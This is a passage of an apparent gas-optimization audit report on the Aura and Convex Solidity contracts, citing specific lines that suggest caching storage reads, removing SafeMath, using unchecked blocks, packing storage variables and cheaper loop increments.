>= periodFinish) {//@audit gas: SLOAD 1 (periodFinish)\n  336:         uint256 elapsedTime = block.timestamp.sub(periodFinish.sub(duration));//@audit gas: SLOAD 2 (periodFinish)\n```\n\n```solidity\n  356:         if (block.timestamp >= periodFinish) {//@audit gas: SLOAD 1 (periodFinish)\n  359:             uint256 remaining = periodFinish.sub(block.timestamp);//@audit gas: SLOAD 2 (periodFinish)\n```\n\n- convex-platform/contracts/contracts/BaseRewardPool4626.sol:\n\n```solidity\n  59:         uint256 balBefore = stakingToken.balanceOf(address(this));//@audit gas: SLOAD 1 (stakingToken)\n  61:         uint256 balAfter = stakingToken.balanceOf(address(this));//@audit gas: SLOAD 2 (stakingToken)\n```\n\n- convex-platform/contracts/contracts/Booster.sol:\n\n```solidity\n  220:         require(lockRewards != address(0) && rewardFactory != address(0), \"!initialised\"); //@audit gas: SLOAD 1 (lockRewards), should cache it\n  232:                     rewards: lockRewards, //@audit gas: SLOAD 2 (lockRewards), should use suggested cache\n  235:                 emit FeeInfoUpdated(_feeDistro, lockRewards, crv); //@audit gas: SLOAD 3 (lockRewards), should use suggested cache\n  238:                 address rewards = IRewardFactory(rewardFactory).CreateTokenRewards(_feeToken, lockRewards, address(this)); //@audit gas: SLOAD 2 (lockRewards), should use suggested cache\n```\n\n```solidity\n  323:         address newRewardPool = IRewardFactory(rewardFactory).CreateCrvRewards(pid,token,_lptoken); //@audit gas: SLOAD 1 (rewardFactory), should cache it\n  345:             IRewardFactory(rewardFactory).setAccess(stash,true); //@audit gas: SLOAD 2 (rewardFactory), should use suggested cache\n```\n\n```solidity\n  464:         if (!pool.shutdown) { //@audit gas: SLOAD 1 (!pool.shutdown), should cache it\n  471:         if(stash != address(0) && !isShutdown && !pool.shutdown){ //@audit gas: SLOAD 2 (!pool.shutdown), should use suggested cache\n```\n\n```solidity\n  602:             if(treasury != address(0) && treasury != address(this) && platformFee > 0){ //@audit gas: SLOAD 1 & 2 (treasury) and SLOAD 1 (platformFee), should cache them\n  604:                 uint256 _platform = crvBal.mul(platformFee).div(FEE_DENOMINATOR); //@audit gas: SLOAD 2 (platformFee), should use suggested cache\n  606:                 IERC20(crv).safeTransfer(treasury, _platform); //@audit gas: SLOAD 2 (treasury), should use suggested cache\n```\n\n```solidity\n  621:             IERC20(crv).safeTransfer(lockRewards, _lockIncentive); //@audit gas: SLOAD 1 (lockRewards), should cache it\n  622:             IRewards(lockRewards).queueNewRewards(_lockIncentive); //@audit gas: SLOAD 2 (lockRewards), should use suggested cache\n```\n\n- convex-platform/contracts/contracts/BoosterOwner.sol:\n\n```solidity\n   96:         require(pendingowner == msg.sender, \"!pendingowner\"); //@audit gas: SLOAD 1 (pendingowner)\n   97:         owner = pendingowner; //@audit gas: SLOAD 2 (pendingowner), should use msg.sender (costs 2 gas)\n   99:         emit AcceptedOwnership(owner); //@audit gas: SLOAD 3 (pendingowner, now owner), should use msg.sender (costs 2 gas)\n```\n\n```solidity\n  163:         forceTimestamp = block.timestamp + FORCE_DELAY; //@audit gas: should cache \"block.timestamp + FORCE_DELAY\" to avoid a future SLOAD\n  165:         emit ShutdownStarted(forceTimestamp); //@audit gas: should use suggested cache for \"block.timestamp + FORCE_DELAY\"\n```\n\n- convex-platform/contracts/contracts/ConvexMasterChef.sol:\n\n```solidity\n  188:         if (block.number <= pool.lastRewardBlock) { //@audit gas: SLOAD 1 (pool.lastRewardBlock), should cache it\n  196:         uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number); //@audit gas: SLOAD 2 (pool.lastRewardBlock), should use cache\n```\n\n```solidity\n  216:                 .mul(pool.accCvxPerShare) //@audit gas: SLOAD 1 (pool.accCvxPerShare)\n  226:         user.amount = user.amount.add(_amount); //@audit gas: should cache \"user.amount.add(_amount)\" in memory to avoid a future SLOAD\n  227:         user.rewardDebt = user.amount.mul(pool.accCvxPerShare).div(1e12); //@audit gas: SLOAD 2 (pool.accCvxPerShare)\n  232:             _rewarder.onReward(_pid, msg.sender, msg.sender, 0, user.amount); //@audit gas: should use suggested cache for \"user.amount.add(_amount)\"\n```\n\n```solidity\n  242:         require(user.amount >= _amount, \"withdraw: not good\"); //@audit gas: SLOAD 1 (user.amount), should cache it\n  244:         uint256 pending = user.amount.mul(pool.accCvxPerShare).div(1e12).sub(//@audit gas: SLOAD 2 (user.amount), should use suggested cache\n  248:         user.amount = user.amount.sub(_amount); //@audit gas: should cache \"user.amount.sub(_amount)\" in memory to avoid a future SLOAD, using previous cache for \"user.amount\"\n  249:         user.rewardDebt = user.amount.mul(pool.accCvxPerShare).div(1e12);//@audit gas: should use suggested cache for \"user.amount.sub(_amount)\"\n  255:             _rewarder.onReward(_pid, msg.sender, msg.sender, pending, user.amount);//@audit gas: should use suggested cache for \"user.amount.sub(_amount)\"\n```\n\n```solidity\n  267:         uint256 pending = user.amount.mul(pool.accCvxPerShare).div(1e12).sub( //@audit gas: SLOAD 1 (user.amount), should cache it\n  271:         user.rewardDebt = user.amount.mul(pool.accCvxPerShare).div(1e12);//@audit gas: SLOAD 2 (user.amount), should use suggested cache\n  276:             _rewarder.onReward(_pid, _account, _account, pending, user.amount);//@audit gas: SLOAD 3 (user.amount), should use suggested cache\n```\n\n```solidity\n  286:         pool.lpToken.safeTransfer(address(msg.sender), user.amount); //@audit gas: SLOAD 1 (user.amount), should cache it\n  287:         emit EmergencyWithdraw(msg.sender, _pid, user.amount);//@audit gas: SLOAD 2 (user.amount), should use suggested cache\n```\n\n- convex-platform/contracts/contracts/CrvDepositor.sol:\n\n```solidity\n  145:         if(incentiveCrv > 0){ //@audit gas: SLOAD 1 (incentiveCrv), should cache it\n  146:             ITokenMinter(minter).mint(msg.sender,incentiveCrv); //@audit gas: SLOAD 2 (incentiveCrv), should use suggested cache\n```\n\n```solidity\n  175:             if(incentiveCrv > 0){ //@audit gas: SLOAD 1 (incentiveCrv), should cache it\n  177:                 _amount = _amount.add(incentiveCrv); //@audit gas: SLOAD 2 (incentiveCrv), should use suggested cache\n```\n\n```solidity\n  184:             uint256 callIncentive = _amount.mul(lockIncentive).div(FEE_DENOMINATOR); //@audit gas: SLOAD 1 (incentiveCrv), should cache it\n  188:             incentiveCrv = incentiveCrv.add(callIncentive); //@audit gas: SLOAD 2 (incentiveCrv), should use suggested cache\n```\n\n- convex-platform/contracts/contracts/ExtraRewardStashV3.sol:\n\n```solidity\n   97:         require(msg.sender == operator, \"!operator\"); //@audit gas: SLOAD 1 (operator), should cache it\n  104:             IDeposit(operator).setGaugeRedirect(pid); //@audit gas: SLOAD 2 (operator), should use suggested cache\n  111:             IDeposit(operator).claimRewards(pid,gauge); //@audit gas: SLOAD 2 (operator), should use suggested cache\n```\n\n```solidity\n  196:         require(msg.sender == operator, \"!operator\"); //@audit gas: SLOAD 1 (operator), should cache it\n  209:                     IERC20(token).safeTransfer(operator, amount); //@audit gas: SLOAD 2 (operator), should use suggested cache\n```\n\n- convex-platform/contracts/contracts/StashFactoryV2.sol:\n\n```solidity\n  60:             require(v3Implementation!=address(0),\"0 impl\"); //@audit gas: SLOAD 1 (v3Implementation), should cache it\n  61:             address stash = IProxyFactory(proxyFactory).clone(v3Implementation);//@audit gas: SLOAD 2 (v3Implementation), should use suggested cache\n```\n\n```solidity\n  67:             require(v1Implementation!=address(0),\"0 impl\");//@audit gas: SLOAD 1 (v1Implementation), should cache it\n  68:             address stash = IProxyFactory(proxyFactory).clone(v1Implementation);//@audit gas: SLOAD 2 (v1Implementation), should use suggested cache\n```\n\n```solidity\n  74:             require(v2Implementation!=address(0),\"0 impl\");//@audit gas: SLOAD 1 (v2Implementation), should cache it\n  75:             address stash = IProxyFactory(proxyFactory).clone(v2Implementation);//@audit gas: SLOAD 2 (v2Implementation), should use suggested cache\n```\n\n- convex-platform/contracts/contracts/VoterProxy.sol:\n\n```solidity\n  193:         _asset.safeApprove(rewardDeposit, 0); //@audit gas: SLOAD 1 (rewardDeposit), should cache it\n  194:         _asset.safeApprove(rewardDeposit, balance); //@audit gas: SLOAD 2 (rewardDeposit), should use suggested cache\n  195:         IRewardDeposit(rewardDeposit).addReward(address(_asset), balance); //@audit gas: SLOAD 3 (rewardDeposit), should use suggested cache\n```\n\n```solidity\n  306:         require(msg.sender == operator, \"!auth\");  //@audit gas: SLOAD 1 (operator), should cache it\n  311:             IERC20(crv).safeTransfer(operator, _balance); //@audit gas: SLOAD 2 (operator), should use suggested cache\n```\n\n```solidity\n  334:         require(msg.sender == operator, \"!auth\"); //@audit gas: SLOAD 1 (operator), should cache it\n  337:         IERC20(_token).safeTransfer(operator, _balance); //@audit gas: SLOAD 2 (operator), should use suggested cache\n```\n\n## Not using SafeMath can save gas on arithmetics operations that can't underflow/overflow\n\nWhen an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), SafeMath isn't necessary (see `@audit` tags):\n\n- convex-platform/contracts/contracts/VirtualBalanceRewardPool.sol:\n\n```solidity\n  241          if (block.timestamp >= periodFinish) {\n  242              rewardRate = reward.div(duration);\n  243          } else {\n  244:             uint256 remaining = periodFinish.sub(block.timestamp); //@audit gas: SafeMath not necessary due to L241\n```\n\n- convex-platform/contracts/contracts/VoterProxy.sol:\n\n```solidity\n  209          if (_balance < _amount) {\n  210:             _amount = _withdrawSome(_gauge, _amount.sub(_balance)); //@audit gas: SafeMath not necessary due to L209 \n```\n\n## SafeMath is not needed when using Solidity version 0.8.11\n\nSolidity version 0.8.11 already implements overflow and underflow checks by default.\nUsing the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8+ overflow checks) is therefore redundant.\n\nI suggest using the built-in checks instead of SafeMath and remove SafeMath here:\n\n```solidity\ncontracts/AuraBalRewardPool.sol:\n   2: pragma solidity ^0.8.11;\n   5: import { SafeMath } from \"@openzeppelin/contracts-0.8/utils/math/SafeMath.sol\";\n  24:     using SafeMath for uint256;\n\ncontracts/AuraStakingProxy.sol:\n   2: pragma solidity ^0.8.11;\n   7: import { SafeMath } from \"@openzeppelin/contracts-0.8/utils/math/SafeMath.sol\";\n  35:     using SafeMath for uint256;\n```\n\n## Unchecking arithmetics operations that can't underflow/overflow\n\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tags for more details):\n\n- contracts/AuraBalRewardPool.sol:\n\n```solidity\n  182              } else {\n  183                  uint256 penalty = (reward * 2) / 10;\n  184                  pendingPenalty += penalty;\n  185:                 rewardToken.safeTransfer(msg.sender, reward - penalty); //@audit should be unchecked due to L183 (penalty == 0.2 * reward)\n```\n\n- contracts/AuraLocker.sol:\n\n```solidity\n  278          if (idx == 0 || userLocks[_account][idx - 1].unlockTime < unlockTime) {\n  279              userLocks[_account].push(LockedBalance({ amount: lockAmount, unlockTime: uint32(unlockTime) }));\n  280          } else {\n  281:             LockedBalance storage userL = userLocks[_account][idx - 1]; //@audit should be unchecked due to L278 (idx != 0 here)\n  282              userL.amount = userL.amount.add(lockAmount);\n  283          }\n```\n\n```solidity\n  471          require(len > 0, \"Nothing to delegate\");\n  ...\n  484:         uint256 i = len - 1; //@audit should be unchecked due to L471 (len > 0)\n```\n\n```solidity\n  520              if (ckpts.length > 0) {\n  521:                 DelegateeCheckpoint memory prevCkpt = ckpts[ckpts.length - 1]; //@audit should be unchecked due to L520 (ckpts.length > 0)\n```\n\n```solidity\n  640:         return high == 0 ? DelegateeCheckpoint(0, 0) : ckpts[high - 1]; //@audit should be unchecked due to condition on same line\n```\n\n```solidity\n  863          if (block.timestamp >= rdata.periodFinish) {\n  864              rdata.rewardRate = _reward.div(rewardsDuration).to96();\n  865          } else {\n  866:             uint256 remaining = uint256(rdata.periodFinish).sub(block.timestamp); //@audit gas: Should be unchecked due to L863 + SafeMath not necessary due Solidity 0.8+\n```\n\n- contracts/AuraMerkleDrop.sol:\n\n```solidity\n  134          } else {\n  135              // If there is an address for auraLocker, and not locking, apply 20% penalty\n  136              uint256 penalty = address(auraLocker) == address(0) ? 0 : (_amount * 2) / 10;\n  137              pendingPenalty += penalty;\n  138:             aura.safeTransfer(msg.sender, _amount - penalty); //@audit should be unchecked as penalty is at most 20% of _amount\n  139          }\n```\n\n- contracts/AuraVestedEscrow.sol:\n\n```solidity\n   49      constructor(\n   ...\n   57          require(endtime_ > starttime_, \"end must be greater\");\n   ...\n   65:         totalTime = endTime - startTime; //@audit should be unchecked due to L57 (endtime_ > starttime_)\n```\n\n```solidity\n  158          if (_time < startTime) {\n  159              return 0;\n  160          }\n  161          uint256 locked = totalLocked[_recipient];\n  162:         uint256 elapsed = _time - startTime; //@audit should be unchecked due to L158\n```\n\n- contracts/ExtraRewardsDistributor.sol:\n\n```solidity\n   74:             require(len == 0 || rewardEpochs[_token][len - 1] < _epoch, \"Cannot backdate to this epoch\"); //@audit should be unchecked due to 1st condition protecting the 2nd's underflow\n```\n\n```solidity\n  102:         if (len == 0 || rewardEpochs[_token][len - 1] < _epoch) { //@audit should be unchecked due to 1st condition protecting the 2nd's underflow\n```\n\n## `Booster`: Tighly pack storage variables\n\nHere, the storage variables can be tightly packed from:\n\n```solidity\nFile: Booster.sol\n45:     address public lockRewards; //@audit 20 bytes\n46: \n47:     mapping(address => FeeDistro) public feeTokens;\n48:     struct FeeDistro {\n49:         address distro;\n50:         address rewards;\n51:         bool active;\n52:     }\n53: \n54:     bool public isShutdown; //@audit 1 byte\n55: \n56:     struct PoolInfo {\n57:         address lptoken;\n58:         address token;\n59:         address gauge;\n60:         address crvRewards;\n61:         address stash;\n62:         bool shutdown;\n63:     }\n64: \n65:     //index(pid) -> pool\n66:     PoolInfo[] public poolInfo;\n```\n\nto\n\n```solidity\n    address public lockRewards;  //@audit 20 bytes\n\n    bool public isShutdown;  //@audit 1 byte (same slot as above)\n\n    mapping(address => FeeDistro) public feeTokens;\n```\n\nWhich would save 1 storage slot.\n\n## `CrvDepositor`: Tighly pack storage variables\n\nFrom:\n\n```solidity\nFile: CrvDepositor.sol\n32:     address public feeManager;\n33:     address public daoOperator; //@audit 20 bytes\n34:     address public immutable staker;\n35:     address public immutable minter;\n36:     uint256 public incentiveCrv = 0;\n37:     uint256 public unlockTime; //@audit 32 bytes\n38: \n39:     bool public cooldown; //@audit 1 byte\n```\n\nto:\n\n```solidity\n    address public feeManager;\n    address public daoOperator; //@audit 20 bytes\n    bool public cooldown; //@audit 1 byte (same slot as the above address)\n    address public immutable staker;\n    address public immutable minter;\n    uint256 public incentiveCrv = 0;\n    uint256 public unlockTime; //@audit 32 bytes\n```\n\nWhich would save 1 storage slot.\n\n## `ExtraRewardStashV3`: Tighly pack storage variables\n\nFrom:\n\n```solidity\nFile: ExtraRewardStashV3.sol\n36:     address public gauge;\n37:     address public rewardFactory; //@audit 20 bytes\n38:    \n39:     mapping(address => uint256) public historicalRewards;\n40:     bool public hasRedirected; //@audit 1 byte\n41:     bool public hasCurveRewards; //@audit 1 byte (same slot as above)\n42: \n43:     struct TokenInfo {\n44:         address token;\n45:         address rewardAddress;\n46:     }\n47: \n48:     //use mapping+array so that we dont have to loop check each time setToken is called\n49:     mapping(address => TokenInfo) public tokenInfo;\n```\n\nto:\n\n```solidity\n    address public gauge;\n    address public rewardFactory; //@audit 20 bytes\n   \n    bool public hasRedirected;  //@audit 1 byte(same slot as above)\n    bool public hasCurveRewards;  //@audit 1 byte (same slot as above)\n\n    mapping(address => uint256) public historicalRewards;\n\n    struct TokenInfo {\n        address token;\n        address rewardAddress;\n    }\n\n    //use mapping+array so that we dont have to loop check each time setToken is called\n    mapping(address => TokenInfo) public tokenInfo;\n```\n\nWhich would save 1 storage slot.\n\n## Boolean comparisons\n\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(directValue)` instead of `if(directValue == true)` and `if(!directValue)` instead of `if(directValue == false)` here:\n\n```solidity\ncontracts/AuraMerkleDrop.sol:123:        require(hasClaimed[msg.sender] == false, \"already claimed\");\nconvex-platform/contracts/contracts/Booster.sol:400:        require(pool.shutdown == false, \"pool is closed\");\nconvex-platform/contracts/contracts/Booster.sol:574:        require(pool.shutdown == false, \"pool is closed\");\nconvex-platform/contracts/contracts/RewardFactory.sol:72:        require(msg.sender == operator || rewardAccess[msg.sender] == true, \"!auth\");\nconvex-platform/contracts/contracts/VoterProxy.sol:107:        require(operator == address(0) || IDeposit(operator).isShutdown() == true, \"needs shutdown\");\nconvex-platform/contracts/contracts/VoterProxy.sol:168:        if(protectedTokens[_token] == false){\nconvex-platform/contracts/contracts/VoterProxy.sol:171:        if(protectedTokens[_gauge] == false){\nconvex-platform/contracts/contracts/VoterProxy.sol:190:        require(protectedTokens[address(_asset)] == false, \"protected\");\n```\n\n## `> 0` is less efficient than `!= 0` for unsigned integers (with proof)\n\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\ncontracts/Aura.sol:68:        require(_amount > 0, \"Must mint something\");\ncontracts/AuraBalRewardPool.sol:121:        require(_amount > 0, \"RewardPool : Cannot stake 0\");\ncontracts/AuraBalRewardPool.sol:139:        require(_amount > 0, \"RewardPool : Cannot stake 0\");\ncontracts/AuraBalRewardPool.sol:157:        require(amount > 0, \"RewardPool : Cannot withdraw 0\");\ncontracts/AuraBalRewardPool.sol:210:        require(rewardsAvailable > 0, \"!balance\");\ncontracts/AuraLocker.sol:210:        require(rewardData[_rewardsToken].lastUpdateTime > 0, \"Reward does not exist\");\ncontracts/AuraLocker.sol:259:        require(_amount > 0, \"Cannot stake 0\");\ncontracts/AuraLocker.sol:359:        require(amt > 0, \"Nothing locked\");\ncontracts/AuraLocker.sol:385:        require(length > 0, \"no locks\");\ncontracts/AuraLocker.sol:431:        require(locked > 0, \"no exp locks\");\ncontracts/AuraLocker.sol:471:        require(len > 0, \"Nothing to delegate\");\ncontracts/AuraLocker.sol:822:        require(_rewards > 0, \"No reward\");\ncontracts/AuraLocker.sol:851:        require(_reward > 0, \"No reward\");\ncontracts/AuraMerkleDrop.sol:122:        require(_amount > 0, \"!amount\");\ncontracts/AuraPenaltyForwarder.sol:52:        require(bal > 0, \"!empty\");\ncontracts/AuraVestedEscrow.sol:118:        require(totalLocked[_recipient] > 0, \"!funding\");\ncontracts/BalLiquidityProvider.sol:57:            require(bal > 0 && bal == _request.maxAmountsIn[i], \"!bal\");\ncontracts/BalLiquidityProvider.sol:70:        require(balAfter > 0, \"!mint\");\ncontracts/ExtraRewardsDistributor.sol:171:        require(_index > 0 && _index < rewardEpochs[_token].length - 1, \"!past\");\nconvex-platform/contracts/contracts/interfaces/BoringMath.sol:20:        require(b > 0, \"BoringMath: division by zero\");\nconvex-platform/contracts/contracts/interfaces/BoringMath.sol:102:        require(b > 0, \"BoringMath: division by zero\");\nconvex-platform/contracts/contracts/interfaces/BoringMath.sol:123:        require(b > 0, \"BoringMath: division by zero\");\nconvex-platform/contracts/contracts/interfaces/BoringMath.sol:143:        require(b > 0, \"BoringMath: division by zero\");\nconvex-platform/contracts/contracts/BaseRewardPool.sol:211:        require(_amount > 0, 'RewardPool : Cannot stake 0');\nconvex-platform/contracts/contracts/BaseRewardPool.sol:227:        require(amount > 0, 'RewardPool : Cannot withdraw 0');\nconvex-platform/contracts/contracts/Booster.sol:223:        require(IFeeDistributor(_feeDistro).getTokenTimeCursor(_feeToken) > 0, \"!distro\");\nconvex-platform/contracts/contracts/CrvDepositor.sol:169:        require(_amount > 0,\"!>0\");\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:104:        require(weight > 0, \"must have weight\");\n```\n\nAlso, please enable the Optimizer.\n\n## `>=` is cheaper than `>` (and `<=` cheaper than `<`)\n\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas). This also holds true between `<=` and `<`.  \n\nConsider replacing strict inequalities with non-strict ones to save some gas here:\n\n```solidity\ncontracts/AuraLocker.sol:724:        uint256 epochIndex = _epoch > lastIndex ? lastIndex : _epoch;\ncontracts/AuraMath.sol:11:        return a < b ? a : b;\ncontracts/ExtraRewardsDistributor.sol:225:        epochIndex = _startIndex > epochIndex ? _startIndex : epochIndex;\nconvex-platform/contracts/contracts/interfaces/MathUtil.sol:12:        return a < b ? a : b;\nconvex-platform/contracts/contracts/ConvexMasterChef.sol:146:        uint256 clampedTo = _to > endBlock ? endBlock : _to;\nconvex-platform/contracts/contracts/ConvexMasterChef.sol:147:        uint256 clampedFrom = _from > endBlock ? endBlock : _from;\n```\n\n## `CrvDepositor.sol#setFees()`: Tautology on \"_lockIncentive >= 0\" which is always true as `_lockIncentive` is uint256\n\nAs a variable of type `uint` will always be `>= 0`, such a check isn't necessary.\n\nConsider deleting the `>= 0` check L75:\n\n```solidity\nFile: CrvDepositor.sol\n72:     function setFees(uint256 _lockIncentive) external{\n73:         require(msg.sender==feeManager, \"!auth\");\n74: \n75:         if(_lockIncentive >= 0 && _lockIncentive <= 30){ //@audit gas: Tautology on the 1st condition\n76:             lockIncentive = _lockIncentive;\n77:        }\n```\n\n## Splitting `require()` statements that use `&&` saves gas\n\nIf you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement:\n\n```solidity\ncontracts/AuraStakingProxy.sol:\n   90:         require(_outputBps > 9000 && _outputBps < 10000, \"Invalid output bps\");\n  159:         require(_token != crv && _token != cvx && _token != cvxCrv, \"not allowed\");\n  203:         require(address(_token) != crv && address(_token) != cvxCrv, \"not allowed\");\n\ncontracts/BalLiquidityProvider.sol:\n  48:         require(_request.assets.length == 2 && _request.maxAmountsIn.length == 2, \"!valid\");\n  57:             require(bal > 0 && bal == _request.maxAmountsIn[i], \"!bal\");\n\ncontracts/ExtraRewardsDistributor.sol:\n  171:         require(_index > 0 && _index < rewardEpochs[_token].length - 1, \"!past\");\n\nconvex-platform/contracts/contracts/Booster.sol:\n  220:         require(lockRewards != address(0) && rewardFactory != address(0), \"!initialised\"); \n  222:         require(_feeToken != address(0) && _feeDistro != address(0), \"!addresses\");\n  278:         require(_lockFees >= 300 && _lockFees <= 1500, \"!lockFees\");\n  279:         require(_stakerFees >= 300 && _stakerFees <= 1500, \"!stakerFees\");\n  280:         require(_callerFees >= 10 && _callerFees <= 100, \"!callerFees\");\n  313:         require(msg.sender==poolManager && !isShutdown, \"!add\");\n  314:         require(_gauge != address(0) && _lptoken != address(0),\"!param\");\n\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:\n  111:         require(!usedMap[_lptoken] && !usedMap[_gauge], \"cant force used pool\");\n\nconvex-platform/contracts/contracts/StashFactoryV2.sol:\n  83:         require(!isV1 && !isV2 && !isV3,\"stash version mismatch\");\n```\n\n## Using `bool` for storage incurs overhead\n\nBooleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.\n\n```solidity\ncontracts/AuraLocker.sol:\n  114:     bool public isShutdown = false;\n\ncontracts/AuraVestedEscrow.sol:\n   33:     bool public initialised = false; \n\nconvex-platform/contracts/contracts/Booster.sol:\n   54:     bool public isShutdown; \n\nconvex-platform/contracts/contracts/BoosterOwner.sol:\n   49:     bool public isSealed;\n   53:     bool public isForceTimerStarted; \n\nconvex-platform/contracts/contracts/CrvDepositor.sol:\n   39:     bool public cooldown; \n\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:\n  40:     bool public hasRedirected; \n  41:     bool public hasCurveRewards; \n\nconvex-platform/contracts/contracts/PoolManagerProxy.sol:\n  72:         bool gaugeExists = IPools(pools).gaugeMap(_gauge);\n\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:\n  24:     bool public isShutdown;\n\nconvex-platform/contracts/contracts/PoolManagerV3.sol:\n  22:     bool public protectAddPool;\n```\n\n## Shift Right instead of Dividing by 2\n\nA division by 2 can be calculated by shifting one to the right.\n\nWhile the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\nI suggest replacing `/ 2` with `>> 1` here:\n\n```solidity\ncontracts/AuraMath.sol:36:        return (a / 2) + (b / 2) + (((a % 2) + (b % 2)) / 2);\n```\n\n## An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop consumes more gas than necessary.\n  \nIn the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use this new variable instead:\n\n```solidity\ncontracts/AuraClaimZap.sol:143:        for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147:        for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151:        for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:696:        for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\ncontracts/AuraVestedEscrow.sol:100:        for (uint256 i = 0; i < _recipient.length; i++) {\nconvex-platform/contracts/contracts/ArbitartorVault.sol:49:       for(uint256 i = 0; i < _toPids.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:214:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:230:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:262:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:296:            for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/Booster.sol:379:        for(uint i=0; i < poolInfo.length; i++){\nconvex-platform/contracts/contracts/Booster.sol:538:        for(uint256 i = 0; i < _gauge.length; i++){\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:69:        for(uint i=0; i < usedList.length; i++){\n```\n\n## `++i` costs less gas compared to `i++` or `i += 1`\n\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\nThe same is also true for `i--`.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nAffected code:  \n\n- Increments:\n\n```solidity\ncontracts/AuraClaimZap.sol:143:        for (uint256 i = 0; i < rewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:147:        for (uint256 i = 0; i < extraRewardContracts.length; i++) {\ncontracts/AuraClaimZap.sol:151:        for (uint256 i = 0; i < tokenRewardContracts.length; i++) {\ncontracts/AuraLocker.sol:174:            for (uint256 i = 0; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:306:        for (uint256 i; i < rewardTokensLength; i++) {\ncontracts/AuraLocker.sol:410:            for (uint256 i = nextUnlockIndex; i < length; i++) {\ncontracts/AuraLocker.sol:426:                nextUnlockIndex++;\ncontracts/AuraLocker.sol:696:        for (uint256 i = nextUnlockIndex; i < locks.length; i++) {\ncontracts/AuraLocker.sol:702:                idx++;\ncontracts/AuraLocker.sol:773:        for (uint256 i = 0; i < userRewardsLength; i++) {\ncontracts/AuraVestedEscrow.sol:100:        for (uint256 i = 0; i < _recipient.length; i++) {\ncontracts/BalLiquidityProvider.sol:51:        for (uint256 i = 0; i < 2; i++) {\ncontracts/ExtraRewardsDistributor.sol:233:        for (uint256 i = epochIndex; i < tokenEpochs; i++) {\nconvex-platform/contracts/contracts/ArbitartorVault.sol:49:       for(uint256 i = 0; i < _toPids.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:214:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:230:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:262:        for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/BaseRewardPool.sol:296:            for(uint i=0; i < extraRewards.length; i++){\nconvex-platform/contracts/contracts/Booster.sol:379:        for(uint i=0; i < poolInfo.length; i++){\nconvex-platform/contracts/contracts/Booster.sol:538:        for(uint256 i = 0; i < _gauge.length; i++){\nconvex-platform/contracts/contracts/BoosterOwner.sol:144:        for(uint256 i = 0; i < poolCount; i++){\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:125:        for(uint256 i = 0; i < maxRewards; i++){\nconvex-platform/contracts/contracts/ExtraRewardStashV3.sol:199:        for(uint i=0; i < tCount; i++){\nconvex-platform/contracts/contracts/PoolManagerSecondaryProxy.sol:69:        for(uint i=0; i < usedList.length; i++){\n```\n\n- Decrements:\n  \n```solidity\ncontracts/AuraLocker.sol:\n  497:                 i--;\n  664:         for (uint256 i = locksLength; i > 0; i--) {\n  726:         for (uint256 i = epochIndex + 1; i > 0; i--) {\n```\n\nConsider using `++i` instead of `i++` to increment the value of an uint variable. The same holds true with decrements (`--i` vs `i--`)\n\n## 